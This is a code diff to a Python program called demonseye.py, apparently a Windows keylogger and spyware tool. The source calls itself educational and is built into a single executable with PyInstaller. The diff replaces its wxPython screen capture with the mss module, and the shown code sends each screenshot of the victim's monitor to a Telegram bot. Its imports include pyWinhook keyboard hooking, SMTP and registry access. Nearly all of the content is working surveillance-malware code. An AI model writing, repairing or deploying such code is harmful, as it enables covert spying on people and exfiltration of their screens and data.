@@ -31,15 +31,14 @@
 #
 #
 # Required:         Install with "pip install module-name-required"
-#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2
-#                   This list could be incomplete.
-#                   Install the necessary modules that are requested when executing the program.
+#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2, mss
+#                   This list could be incomplete, please check requeriments.txt file
 #
 # Binary Gen:       To create the executable in Windows, PyInstaller has been used.
 #                   Executable compression is disabled and the creation of a single file is forced.
 #                   pyinstaller --noupx -F demonseye.py
 #
-# Notes:            This code has been tested, developed and designed to work in a Windows environment.
+# Notes:            This code has been tested, developed and designed to work in a Windows 10 x64 environment.
 #                   Its purpose is only educational.
 #
 # Updates:
@@ -64,6 +63,7 @@ import getpass
 import glob
 import json
 import logging
+import mss
 import os
 import platform
 from smtplib import SMTP
@@ -80,7 +80,7 @@ import urllib.request
 import win32console
 import win32gui
 import winreg
-import wx
+
 
 ########################################################
 # CONSTANTS
@@ -166,6 +166,7 @@ class ScreenShootThread(threading.Thread):
 
     def run(self):
         logging.debug('Guardado captura {}'.format(self.screen_file))
+        '''
         app = wx.App()                  # Need to create an App instance before doing anything
         screen = wx.ScreenDC()
         size_x, size_y = screen.GetSize()
@@ -175,6 +176,10 @@ class ScreenShootThread(threading.Thread):
         del mem                         # free memory containing image capture
         del app                         # free application instance object
         bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
+        '''
+        # Take a screenshot using MSS module
+        with mss.mss() as sct:
+            self.screen_file = sct.shot(mon=1, output=self.screen_file)
         logging.debug('Fin captura {}'.format(self.screen_file))
         # Send screenshot to Telegram bot
         telegram_bot_image(self.screen_file)
